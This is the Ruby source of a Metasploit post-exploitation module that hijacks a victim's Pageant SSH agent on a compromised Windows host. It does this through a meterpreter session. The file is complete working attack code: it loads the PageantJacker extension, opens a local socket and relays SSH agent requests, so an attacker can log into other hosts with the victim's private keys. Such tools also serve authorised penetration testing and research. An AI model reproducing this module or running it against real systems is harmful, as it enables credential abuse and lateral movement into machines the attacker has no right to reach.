##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'tmpdir'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Forward SSH agent requests to Pageant',
        'Description'   => %q{
            This module forwards SSH agent requests from a local socket to a remote Pageant instance.
            If a target Windows machine is compromised and is running Pageant, this will allow the
            attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
            tunnelled through the meterpreter session. This could therefore be used to authenticate
            with a remote host using a private key which is loaded into a remote user's Pageant instance,
            without ever having knowledge of the private key itself.

            Note that this requires the PageantJacker meterpreter extension, but this will be automatically
            loaded into the remote meterpreter session by this module if it is not already loaded.
          },
        'License'       => MSF_LICENSE,
        'Author'        => [ 
            'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
        ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    register_options(
      [
        OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil]),
      ], self.class)
  end

  def run

    # Attempt to load the pageantjacker extension if it isn't already loaded.
    if(!session.pageantjacker)
      print_status("Loading PageantJacker extension on session #{session.sid} (#{session.session_host})")
      session.core.use("pageantjacker")
    end

    # Fail if it cannot be loaded
    if(!session.pageantjacker)
      print_error("Failed to load PageantJacker on session #{session.sid} (#{session.session_host})")
      return false
    end

    # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
    if datastore['SocketPath']
        @sockpath = datastore['SocketPath'].to_s
    else
        @sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    end

    # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
    if ::File.exists?(@sockpath)
        print_error("Your requested socket (#{@sockpath}) already exists. Remove it or choose another path and try again.")
        return false
    end 

    # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
    ::UNIXServer.open(@sockpath) {|serv|
      print_status("Launched listening socket on #{@sockpath}")
      print_status("Set SSH_AUTH_SOCK variable to #{@sockpath} (e.g. export SSH_AUTH_SOCK=\"#{@sockpath}\")")
      print_status("Now use any tool normally (e.g. ssh-add)")

      loop { 
        s = serv.accept
        loop {
          socket_request_data = s.recvfrom(8192)
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          vprint_status("PageantJacker: Received data from socket (size: #{socket_request_data.first.size})")
          response = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
          if response[:success]
            s.send response[:blob],0 
            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{response[:error]}')")
          else
            print_error("PageantJacker: Unsuccessful response received (#{response[:error]})")
          end
        }   
      }   
    }   

  end

  def cleanup
    if @sockpath
        if ::File.exists?(@sockpath)
            ::File.delete(@sockpath)
        end
    end
  end

end
